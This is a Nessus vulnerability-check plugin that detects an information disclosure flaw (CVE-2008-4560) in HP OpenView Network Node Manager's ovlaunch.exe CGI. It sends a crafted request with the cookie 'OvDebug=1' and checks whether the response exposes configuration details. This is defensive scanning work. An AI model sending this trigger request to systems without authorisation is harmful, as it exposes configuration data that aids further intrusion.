#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35656);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2015/09/24 23:21:18 $");

  script_cve_id("CVE-2008-4560");
  script_bugtraq_id(33667);
  script_osvdb_id(53236);

  script_name(english:"HP OpenView Network Node Manager ovlaunch.exe Information Disclosure (c01661610)");
  script_summary(english:"Tries to read configuration information via ovlaunch.exeu");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a CGI script that is affected by an
information disclosure vulnerability.");
  script_set_attribute( attribute:"description",  value:
"The 'ovlaunch.exe' CGI script included with the version of HP OpenView
Network Node Manager installed on the remote host reveals various
configuration details in response to a specially crafted request.  An
unauthenticated, remote attacker could leverage this information to
launch further attacks against the affected application and/or host.

Note that this install is also likely affected by other serious issues
although Nessus has not checked for other issues.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ddd749ed");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500736/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e73a5c26");
  script_set_attribute( attribute:"solution",  value:
"Apply the appropriate patch referenced in iDefense's advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(200);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/02/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 3443);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:3443, embedded: 0);


# Loop through directories.
dirs = list_uniq(make_list("/OvCgi", cgi_dirs()));

foreach dir (dirs)
{
  # Try to exploit the issue to view configuration info.
  url = string(dir, "/ovlaunch.exe");

  req = http_mk_get_req(
    port        : port,
    item        : url, 
    add_headers : make_array("Cookie", "OvDebug=1")
  );
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);

  # There's a problem if we see configuration info.
  if (
    (
      'ovlaunch.exe:OvWwwInitialize():' >< res[2] ||
      'ovlaunch:OvWwwInitialize():' >< res[2]
    ) &&
    'OVWWW_VERSION=' >< res[2]
  )
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);
      report = string(
        "\n",
        "Nessus was able to collect configuration details using the following\n",
        "request :\n",
        "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
        req_str, "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
      );
      if (report_verbosity > 1)
      {
        output = res[2];
        if ("Content-type: text/html" >< res[2])
          output = output - strstr(output, "Content-type: text/html");

        report = string(
          report,
          "\n",
          "Here is the information obtained :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          output,
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
